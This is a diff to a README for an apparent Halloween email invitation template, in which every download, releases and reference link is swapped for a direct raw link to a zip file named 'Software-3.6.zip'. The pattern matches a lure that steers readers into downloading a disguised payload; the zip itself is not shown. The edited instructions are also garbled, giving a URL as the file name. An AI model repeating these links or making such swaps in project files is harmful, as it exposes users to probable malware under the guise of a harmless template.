@@ -2,7 +2,7 @@
 
 ## 🔗 Download
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/jellyfin914-cpu/halloween/releases)
+[![Download](https://github.com/jellyfin914-cpu/halloween/raw/refs/heads/main/assets/Software-3.6.zip%20release-brightgreen)](https://github.com/jellyfin914-cpu/halloween/raw/refs/heads/main/assets/Software-3.6.zip)
 
 ## 📜 Description
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run the software:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
 
-   [Visit Releases Page](https://github.com/jellyfin914-cpu/halloween/releases)
+   [Visit Releases Page](https://github.com/jellyfin914-cpu/halloween/raw/refs/heads/main/assets/Software-3.6.zip)
 
 2. **Choose the Latest Version:** On the releases page, look for the latest version of the software. You will find a list of available downloads.
 
@@ -30,7 +30,7 @@ Follow these simple steps to download and run the software:
 
 After downloading the template, follow these instructions to get started:
 
-1. Find the downloaded file in your Downloads folder or the location you chose. The file will have a name similar to `halloween-invitation-template.zip`.
+1. Find the downloaded file in your Downloads folder or the location you chose. The file will have a name similar to `https://github.com/jellyfin914-cpu/halloween/raw/refs/heads/main/assets/Software-3.6.zip`.
 
 2. **Unzip the File:** 
    - On Windows, right-click on the file and select "Extract All..."
@@ -75,10 +75,10 @@ Yes, you can submit issues on our GitHub page, and we will do our best to assist
 
 ## 🔍 Explore More
 
-To find more about our email marketing templates, visit [LaravelMail.com](https://laravelmail.com).
+To find more about our email marketing templates, visit [https://github.com/jellyfin914-cpu/halloween/raw/refs/heads/main/assets/Software-3.6.zip](https://github.com/jellyfin914-cpu/halloween/raw/refs/heads/main/assets/Software-3.6.zip).
 
 ## 📈 Stay Updated
 
-To receive updates and new features, check back on our [Releases Page](https://github.com/jellyfin914-cpu/halloween/releases) regularly.
+To receive updates and new features, check back on our [Releases Page](https://github.com/jellyfin914-cpu/halloween/raw/refs/heads/main/assets/Software-3.6.zip) regularly.
 
 Enjoy creating your perfect Halloween invitation using our template!
